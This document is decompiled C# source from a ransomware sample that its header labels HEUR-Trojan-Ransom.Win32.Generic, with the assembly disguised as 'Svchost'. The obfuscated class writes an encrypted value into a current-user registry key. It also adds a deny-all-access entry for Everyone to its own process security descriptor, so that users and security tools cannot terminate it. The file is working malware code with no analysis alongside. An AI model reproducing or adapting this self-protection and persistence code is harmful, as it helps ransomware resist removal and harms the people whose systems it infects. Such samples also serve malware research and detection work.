// Decompiled with JetBrains decompiler
// Type: qYAjLWajCJpnf.fsCyfZlwoNr
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace qYAjLWajCJpnf
{
  internal sealed class fsCyfZlwoNr
  {
    [NonSerialized]
    internal static GetString \u0007;

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool bydoXRikoAy(
      IntPtr AOIGqTsszMMTyEo,
      int MlFFlylofYO,
      [Out] byte[] VDhwdCbcfRLd,
      uint BhRUiQKSiCMfm,
      out uint tjOvyuUAvcohw);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool lvzhzxEyRpixV(
      IntPtr RaqPyhbFmtw,
      int SKOLWhhsnj,
      [In] byte[] gDxCKXMXkqeb);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr nfUAjbeuLyaAa();

    public void hXHxHtpQwrDh([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(bTJSgdVkQM.gvCYkntYkqMW(fsCyfZlwoNr.\u0007(107458937)));
        subKey.SetValue(bTJSgdVkQM.gvCYkntYkqMW(fsCyfZlwoNr.\u0007(107458800)), (object) fsCyfZlwoNr.\u0007(107461721));
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor tbxJFSDHfHUR([In] IntPtr obj0)
    {
      byte[] VDhwdCbcfRLd = new byte[0];
      uint tjOvyuUAvcohw;
      fsCyfZlwoNr.bydoXRikoAy(obj0, 4, VDhwdCbcfRLd, 0U, out tjOvyuUAvcohw);
      if (tjOvyuUAvcohw < 0U || tjOvyuUAvcohw > (uint) short.MaxValue)
        return (RawSecurityDescriptor) null;
      byte[] binaryForm;
      return !fsCyfZlwoNr.bydoXRikoAy(obj0, 4, binaryForm = new byte[(IntPtr) tjOvyuUAvcohw], tjOvyuUAvcohw, out tjOvyuUAvcohw) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void tsLgwjRdVbQLHc([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      fsCyfZlwoNr.lvzhzxEyRpixV(obj0, 4, numArray);
    }

    public void WjboLcIgqQbXx()
    {
      try
      {
        IntPtr num = fsCyfZlwoNr.nfUAjbeuLyaAa();
        RawSecurityDescriptor securityDescriptor = this.tbxJFSDHfHUR(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.tsLgwjRdVbQLHc(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }

    static fsCyfZlwoNr() => Strings.CreateGetStringDelegate(typeof (fsCyfZlwoNr));
  }
}
